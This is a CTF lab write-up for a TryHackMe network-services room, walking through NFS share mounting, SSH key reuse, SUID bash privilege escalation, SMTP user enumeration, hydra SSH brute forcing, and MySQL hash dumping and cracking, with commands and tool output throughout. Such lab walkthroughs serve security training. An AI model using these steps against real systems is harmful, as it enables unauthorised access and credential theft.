---
title: Writeup for TryHackMe room - Network Services 2
author: 4n3i5v74
date: 2021-01-28 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, network, protocols]
pin: false
---

## [Network Services](https://tryhackme.com/room/networkservices2){:target="_blank"}

This room contains info and methods to recon and enumerate `SMB`, `Telnet` and `FTP`


## NFS


### Task 2 - Understanding NFS

Use these links as references.
- [NFS reference](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html){:target="_blank"}
- [NFS reference](https://www.datto.com/library/what-is-nfs-file-share){:target="_blank"}
- [NFS reference](http://nfs.sourceforge.net/){:target="_blank"}
- [NFS reference](https://wiki.archlinux.org/index.php/NFS){:target="_blank"}


### Task 3 - Enumerating NFS

Use these links as references.
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Use `nmap` to find open ports.
{% capture code %}{% raw %}nmap -Pn -T4 -p- -sS --reason --open <ip>{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-03 22:27 IST
Nmap scan report for <ip>
Host is up, received user-set (0.18s latency).
Not shown: 65528 closed ports
Reason: 65528 resets
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
2049/tcp  open  nfs     syn-ack ttl 63
32917/tcp open  unknown syn-ack ttl 63
37411/tcp open  unknown syn-ack ttl 63
39725/tcp open  unknown syn-ack ttl 63
43383/tcp open  unknown syn-ack ttl 63
Nmap done: 1 IP address (1 host up) scanned in 150.25 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}

Since port `2049` is open, we can see if NFS server made any share as public accessible.
{% capture code %}{% raw %}showmount -e <ip>{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}Export list for <ip>:
/home *{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a temporary folder in local machine and try to mount the NFS share.
{% capture code %}{% raw %}mkdir /tmp/mount
mount -t nfs <ip>:/home /tmp/mount -nolock
ls -al /tmp/mount{% endraw %}{% endcapture %} {% include code.html code=code %}

Check if there are any interesting files we can make use of.
{% capture code %}{% raw %}ls -al /tmp/mount/cappucino
ls -al /tmp/mount/cappucino/.ssh/{% endraw %}{% endcapture %} {% include code.html code=code %}

There is rsa key available. Check if its the same key used in `authorized_keys`.
{% capture code %}{% raw %}awk '{print $NF}' /tmp/mount/cappucino/.ssh/id_rsa.pub
awk '{print $NF}' /tmp/mount/cappucino/.ssh/authorized_keys{% endraw %}{% endcapture %} {% include code.html code=code %}

`SSH` to the host should work now with the rsa key present.
{% capture code %}{% raw %}ssh -i /tmp/mount/cappucino/.ssh/id_rsa cappucino@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}


### Task 4 - Exploiting NFS

Use these links as references.
- [Bash binary](https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash){:target="_blank"}


Even though ssh access is obtained, NFS implements `root-squash` setting, which maps remote root users to `nfsnobody`, which contains least privileges. This can be exploited using `SUID` bit set to binary.

Navigate to user's home directory, download the bash binary, and set `SUID`.
{% capture code %}{% raw %}cd /tmp/mount/cappucino
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
chmod +s bash{% endraw %}{% endcapture %} {% include code.html code=code %}

Login to the machine with rsa key and see if `SUID` binary can be run to obtain privilege escalation.
{% capture code %}{% raw %}ssh -i /tmp/mount/cappucino/.ssh/id_rsa cappucino@<ip>
./bash -p
cat /root/root.txt
    <flag>{% endraw %}{% endcapture %} {% include code.html code=code %}


## SMTP


### Task 5 - Understanding SMTP

Use these links as references.
- [SMTP Reference](https://computer.howstuffworks.com/e-mail-messaging/email3.htm){:target="_blank"}
- [SMTP Reference](https://www.afternerd.com/blog/smtp/){:target="_blank"}


### Task 6 - Enumerating SMTP

Use these links as references.
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Use `nmap` to find open ports using quick scan.
{% capture code %}{% raw %}nmap -Pn -T4 -F -sS --reason --open <ip>{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-05 23:06 IST
Nmap scan report for <ip>
Host is up, received user-set (0.16s latency).
Not shown: 98 closed ports
Reason: 98 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
25/tcp open  smtp    syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `msfconsole` to perform auxiliary scans and get information on `smtp`.
{% capture code %}{% raw %}msfconsole
    msf6 > search smtp_version

    Matching Modules

       #  Name                                 Disclosure Date  Rank    Check  Description
       -  ----                                 ---------------  ----    -----  -----------
       0  auxiliary/scanner/smtp/smtp_version                   normal  No     SMTP Banner Grabber

    msf6 > use auxiliary/scanner/smtp/smtp_version
    msf6 auxiliary(scanner/smtp/smtp_version) > options

    Module options (auxiliary/scanner/smtp/smtp_version):

       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT    25               yes       The target port (TCP)
       THREADS  1                yes       The number of concurrent threads (max one per host)

    msf6 auxiliary(scanner/smtp/smtp_version) > set RHOSTS <ip>
    RHOSTS => <ip>
    msf6 auxiliary(scanner/smtp/smtp_version) > exploit

    [+] <ip>:25      - <ip>:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
    [*] <ip>:25      - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

    msf6 auxiliary(scanner/smtp/smtp_version) > use auxiliary/scanner/smtp/smtp_relay
    msf6 auxiliary(scanner/smtp/smtp_relay) > options

    Module options (auxiliary/scanner/smtp/smtp_relay):

       Name      Current Setting     Required  Description
       ----      ---------------     --------  -----------
       EXTENDED  false               yes       Do all the 16 extended checks
       MAILFROM  sender@example.com  yes       FROM address of the e-mail
       MAILTO    target@example.com  yes       TO address of the e-mail
       RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT     25                  yes       The target port (TCP)
       THREADS   1                   yes       The number of concurrent threads (max one per host)

    msf6 auxiliary(scanner/smtp/smtp_relay) > set RHOSTS <ip>
    RHOSTS => <ip>
    msf6 auxiliary(scanner/smtp/smtp_relay) > exploit

    [+] <ip>:25      - SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
    [*] <ip>:25      - No relay detected
    [*] <ip>:25      - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

    msf6 auxiliary(scanner/smtp/smtp_relay) > use auxiliary/scanner/smtp/smtp_enum
    msf6 auxiliary(scanner/smtp/smtp_enum) > options

    Module options (auxiliary/scanner/smtp/smtp_enum):

       Name       Current Setting                                                             Required  Description
       ----       ---------------                                                             --------  -----------
       RHOSTS                                                                                 yes       The target host(s), range CIDR  identifier, or hosts file with syntax 'file:<path>'
       RPORT      25                                                                          yes       The target port (TCP)
       THREADS    1                                                                           yes       The number of concurrent threads (max   one per host)
       UNIXONLY   true                                                                        yes       Skip Microsoft bannered servers when    testing unix users
       USER_FILE  /opt/metasploit-framework/embedded/framework/data/wordlists/unix_users.txt  yes       The file that contains a list of    probable users accounts.

    msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
    USER_FILE => /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
    msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS <ip>
    RHOSTS => <ip>
    msf6 auxiliary(scanner/smtp/smtp_enum) > set THREADS 16
    THREADS => 16

    msf6 auxiliary(scanner/smtp/smtp_enum) > exploit

    [*] <ip>:25      - <ip>:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
    [+] <ip>:25      - <ip>:25 Users found: administrator
    [*] <ip>:25      - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed{% endraw %}{% endcapture %} {% include code.html code=code %}


### Task 7 - Exploiting SMTP

Use these links as references.
- [Install hydra](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-hydra){:target="_blank"}


Use `hydra` to enumerate ssh, since a valid user `administrator` is found in `msfconsole` auxiliary scan.
{% capture code %}{% raw %}hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV <ip> ssh{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}Hydra v9.2-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal  purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-05 23:23:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://<ip>:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://administrator@<ip>:22
[INFO] Successful, password authentication is supported by ssh://<ip>:22
[22][ssh] host: <ip>   login: administrator   password: <password>
[STATUS] attack finished for <ip> (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-05 23:23:59{% endraw %}{% endcapture %} {% include code.html code=code %}

Login to `ssh` session with the cracked password and get the flag.
{% capture code %}{% raw %}ssh administrator@<ip>
cat smtp.txt
    <flag>{% endraw %}{% endcapture %} {% include code.html code=code %}


## MySQL


### Task 8 - Understanding MySQL

Use these links as references.
- [MySQL Reference](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html){:target="_blank"}
- [MySQL Reference](https://www.w3schools.com/php/php_mysql_intro.asp){:target="_blank"}


### Task 9 - Enumerating MySQL

Use these links as references.
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}
- [NMAP Script for MySQL](https://nmap.org/nsedoc/scripts/mysql-enum.html){:target="_blank"}
- [MySQL Exploit](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Use `nmap` to find open ports using quick scan.
{% capture code %}{% raw %}map -Pn -T4 -sS --top 2000 --reason --open <ip>{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-13 17:19 UTC
Nmap scan report for <hostname> (<ip>)
Host is up, received arp-response (0.00081s latency).
Not shown: 1998 closed ports
Reason: 1998 resets
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
MAC Address: 02:9F:FE:B4:B9:EB (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `mysql` to login and verify with credentials `root:password`. The `mysql` binary can be found in `mysql-client` package.
{% capture code %}{% raw %}mysql -h <ip> -u root -p{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}Enter password: password
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> exit
Bye{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `msfconsole` to perform auxiliary scan and get database information.
{% capture code %}{% raw %}msfconsole
    msf5 > search mysql_sql

    Matching Modules

    #  Name                             Disclosure Date  Rank    Check  Description
    -  ----                             ---------------  ----    -----  -----------
    0  auxiliary/admin/mysql/mysql_sql                   normal  No     MySQL SQL Generic Query

    msf5 > use auxiliary/admin/mysql/mysql_sql
    msf5 auxiliary(admin/mysql/mysql_sql) > show options

    Module options (auxiliary/admin/mysql/mysql_sql):

    Name      Current Setting   Required  Description
    ----      ---------------   --------  -----------
    PASSWORD                    no        The password for the specified username
    RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT     3306              yes       The target port (TCP)
    SQL       select version()  yes       The SQL to execute.
    USERNAME                    no        The username to authenticate as

    msf5 auxiliary(admin/mysql/mysql_sql) > show missing

    Module options (auxiliary/admin/mysql/mysql_sql):

    Name    Current Setting  Required  Description
    ----    ---------------  --------  -----------
    RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'

    msf5 auxiliary(admin/mysql/mysql_sql) > set RHOSTS <ip>
    RHOSTS => <ip>
    msf5 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
    USERNAME => root
    msf5 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
    PASSWORD => password
    msf5 auxiliary(admin/mysql/mysql_sql) > exploit
    [*] Running module against <ip>

    [*] <ip>:3306 - Sending statement: 'select version()'...
    [*] <ip>:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
    [*] Auxiliary module execution completed

    msf5 auxiliary(admin/mysql/mysql_sql) > set SQL 'show databases'
    SQL => show databases
    msf5 auxiliary(admin/mysql/mysql_sql) > exploit
    [*] Running module against <ip>

    [*] <ip>:3306 - Sending statement: 'show databases'...
    [*] <ip>:3306 -  | information_schema |
    [*] <ip>:3306 -  | mysql |
    [*] <ip>:3306 -  | performance_schema |
    [*] <ip>:3306 -  | sys |
    [*] Auxiliary module execution completed{% endraw %}{% endcapture %} {% include code.html code=code %}


### Task 10 - Exploiting MySQL

Use `msfconsole` to exploit `mysql` and get password information.
{% capture code %}{% raw %}msfconsole
    msf5 > use auxiliary/scanner/mysql/mysql_schemadump
    msf5 auxiliary(scanner/mysql/mysql_schemadump) > set RHOSTS <ip>
    RHOSTS => <ip>
    msf5 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME root
    USERNAME => root
    msf5 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD password
    PASSWORD => password
    msf5 auxiliary(scanner/mysql/mysql_schemadump) > exploit

    - TableName: x$waits_global_by_latency
        Columns:
        - ColumnName: events
        ColumnType: varchar(128)
        - ColumnName: total
        ColumnType: bigint(20) unsigned
        - ColumnName: total_latency
        ColumnType: bigint(20) unsigned
        - ColumnName: avg_latency
        ColumnType: bigint(20) unsigned
        - ColumnName: max_latency
        ColumnType: bigint(20) unsigned

    [*] <ip>:3306      - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

    msf5 > use auxiliary/scanner/mysql/mysql_hashdump
    msf5 auxiliary(scanner/mysql/mysql_hashdump) > show options

    Module options (auxiliary/scanner/mysql/mysql_hashdump):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    PASSWORD                   no        The password for the specified username
    RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT     3306             yes       The target port (TCP)
    THREADS   1                yes       The number of concurrent threads (max one per host)
    USERNAME                   no        The username to authenticate as

    msf5 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS <ip>
    RHOSTS => <ip>
    msf5 auxiliary(scanner/mysql/mysql_hashdump) >
    msf5 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
    USERNAME => root
    msf5 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
    PASSWORD => password
    msf5 auxiliary(scanner/mysql/mysql_hashdump) > exploit
    msf5 auxiliary(scanner/mysql/mysql_hashdump) > exploit

    [+] <ip>:3306      - Saving HashString as Loot: root:
    [+] <ip>:3306      - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
    [+] <ip>:3306      - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
    [+] <ip>:3306      - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
    [+] <ip>:3306      - Saving HashString as Loot: root:*<hash>
    [+] <ip>:3306      - Saving HashString as Loot: carl:*<hash>
    [*] <ip>:3306      - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed{% endraw %}{% endcapture %} {% include code.html code=code %}

Sae the obtained hash in text and use `john` to crack the hash.
{% capture code %}{% raw %}echo 'carl:*<hash>' > hash.txt
john hash.txt{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}Warning: detected hash type "mysql-sha1", but the string is also recognized as "mysql-sha1-opencl"
Use the "--format=mysql-sha1-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/opt/john/password.lst
Proceeding with incremental:ASCII
<password>           (carl)
1g 0:00:00:01 DONE 3/3 (2021-01-13 17:51) 0.7407g/s 1693Kp/s 1693Kc/s 1693KC/s doggie..doggia
Use the "--show" option to display all of the cracked passwords reliably
Session completed.{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `ssh` to login to the machine with cracked password and obtain the flag.
{% capture code %}{% raw %}ssh carl@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}carl@<ip>'s password: doggie
carl@polomysql:~$ cat MySQL.txt
    <flag>{% endraw %}{% endcapture %} {% include code.html code=code %}

